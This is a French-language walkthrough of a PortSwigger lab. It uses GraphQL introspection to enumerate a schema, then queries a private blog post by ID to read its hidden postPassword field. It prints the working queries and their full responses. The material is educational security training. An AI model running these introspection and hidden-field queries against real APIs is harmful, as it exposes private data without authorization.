# Lab

https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

## Solution

Avec l'instrospection GraphQL, on peut voir que le type `BlogPost` a un champ `postPassword` qui est de type `String`.

```graphql
{
    "query":"query {__schema{types{name, fields{name, type{name}}}}}"
}
```

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "type": {
                "name": null
              }
            },
            {
              "name": "image",
              "type": {
                "name": null
              }
            },
            {
              "name": "title",
              "type": {
                "name": null
              }
            },
            {
              "name": "author",
              "type": {
                "name": null
              }
            },
            {
              "name": "date",
              "type": {
                "name": null
              }
            },
            {
              "name": "summary",
              "type": {
                "name": null
              }
            },
            {
              "name": "paragraphs",
              "type": {
                "name": null
              }
            },
            {
              "name": "isPrivate",
              "type": {
                "name": null
              }
            },
            {
              "name": "postPassword",
              "type": {
                "name": "String"
              }
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "type": {
                "name": null
              }
            },
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "isRepeatable",
              "type": {
                "name": null
              }
            },
            {
              "name": "locations",
              "type": {
                "name": null
              }
            },
            {
              "name": "args",
              "type": {
                "name": null
              }
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "type": {
                "name": null
              }
            },
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "isDeprecated",
              "type": {
                "name": null
              }
            },
            {
              "name": "deprecationReason",
              "type": {
                "name": "String"
              }
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "type": {
                "name": null
              }
            },
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "args",
              "type": {
                "name": null
              }
            },
            {
              "name": "type",
              "type": {
                "name": null
              }
            },
            {
              "name": "isDeprecated",
              "type": {
                "name": null
              }
            },
            {
              "name": "deprecationReason",
              "type": {
                "name": "String"
              }
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "type": {
                "name": null
              }
            },
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "type",
              "type": {
                "name": null
              }
            },
            {
              "name": "defaultValue",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "isDeprecated",
              "type": {
                "name": "Boolean"
              }
            },
            {
              "name": "deprecationReason",
              "type": {
                "name": "String"
              }
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "types",
              "type": {
                "name": null
              }
            },
            {
              "name": "queryType",
              "type": {
                "name": null
              }
            },
            {
              "name": "mutationType",
              "type": {
                "name": "__Type"
              }
            },
            {
              "name": "directives",
              "type": {
                "name": null
              }
            },
            {
              "name": "subscriptionType",
              "type": {
                "name": "__Type"
              }
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "type": {
                "name": null
              }
            },
            {
              "name": "name",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "description",
              "type": {
                "name": "String"
              }
            },
            {
              "name": "fields",
              "type": {
                "name": null
              }
            },
            {
              "name": "interfaces",
              "type": {
                "name": null
              }
            },
            {
              "name": "possibleTypes",
              "type": {
                "name": null
              }
            },
            {
              "name": "enumValues",
              "type": {
                "name": null
              }
            },
            {
              "name": "inputFields",
              "type": {
                "name": null
              }
            },
            {
              "name": "ofType",
              "type": {
                "name": "__Type"
              }
            },
            {
              "name": "specifiedByURL",
              "type": {
                "name": "String"
              }
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "type": {
                "name": "BlogPost"
              }
            },
            {
              "name": "getAllBlogPosts",
              "type": {
                "name": null
              }
            }
          ]
        }
      ]
    }
  }
}
```

On voit aussi qu'l y a une opération `getBlogPost` qui prend un argument `id` de type `Int` et qui retourne un `BlogPost`.

```graphql
{
    "query":"query {__schema{queryType{name, fields{name, args{name, type{name}}}}}}"
}
```

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query",
        "fields": [
          {
            "name": "getBlogPost",
            "args": [
              {
                "name": "id",
                "type": {
                  "name": null
                }
              }
            ]
          },
          {
            "name": "getAllBlogPosts",
            "args": []
          }
        ]
      }
    }
  }
}
```

On peut donc récupérer le post privé avec l'id 3.

```graphql
{
    "query":"query {getBlogPost(id:3){id, summary, postPassword}}"
}
```

```json
{
  "data": {
    "getBlogPost": {
      "id": 3,
      "summary": "In a world where virtual reality has become the new reality, nothing is impossible. Household appliances are becoming robots in their own right. We were treated to an advance viewing of How Your Home Can Work For You; forget smart...",
      "postPassword": "80f13atjwgt0tx2fyrxqd00frax4rhcq"
    }
  }
}
```